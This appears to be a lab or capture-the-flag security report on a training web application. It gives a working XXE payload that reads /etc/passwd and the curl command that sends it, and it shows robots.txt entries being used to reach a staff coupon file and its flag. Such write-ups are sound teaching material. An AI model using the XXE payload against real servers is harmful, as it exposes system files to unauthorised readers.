# Web Application Security

## Security Misconfigurations: 

### Old wasdat- XML External Entity

**Title:** : Perform XXE attack successfully using old wasdat's custom-search functionality in old Wasdat

**Description: ** The attacker abuses the target application by include external entities in its XML parsing. Many web applications use XML to store and transmit data. When an application parses XML input, it may include references to external entities within the XML document.

**Steps to produce:**

1.Navigate to http://wasdat.fi:8080/api/articles/custom-search.
2. Edit oldwasdat-exampe.xml- MALICIOUS XML document and include an external entity declaration pointing to a resource that want to access, in this case want to access

  ‘/etc/passwd’ on the server. As in the example below :
  
   { <?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE foo [<!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
  <search>&xxe;</search> }

3. Send the request to the server by the command:
  curl -X POST http://wasdat.fi:8080/api/articles/custom-search -H "Content-Type:
  text/xml" --data "@/home/kali/Downloads/oldwasdat-example.xml".

4. we received a response which indicate we finish our task for this task as in the screnshot
below.
   
**Impact estimation:**
– – Medium Severity. Receiving a response as a part XML external entity attack can have a several significant impact in data disclosure and security risk.

**Mitigation:**
–use validate and sanitize user-supplied XML input before processing, configure XML to disable External Entities and use content security policy.

---------------------------------------------------------------------------------------------------------------------

### Main target – Coupon codes stored in plain text.

**Title:** Find and locate a sensitives information containing upcoming coupon codes. 

**Description:** Find and locate a sensitives information containing upcoming coupon codes. 

**Steps to produce:**

1. Navigate to https://wasdat.fi.
2. Navigate to the Robots.txt of the wbiste.
    http://Wasdat.fi/robots.txt
3. Inside the robots.txt file there are many disallowed linked which need to look and check .
4. When viewing the URLs found wasdat.fi/private includes two links.
5. Visit the link for codes.txt which may include some information about the code, the text file included the coupon flag.
Coupon codes for staff only!
50% off: Flag{f3014f855}


**Impact estimation:**
– High Severity: User/robot can identify restricted or confidential information on the site and disallow list can serve as a map to the first place to look.


**Mitigation:** Ensure it is correctly configuring, understand the purpose of using robots.txt with your site, create user-agent and test the configuration. 



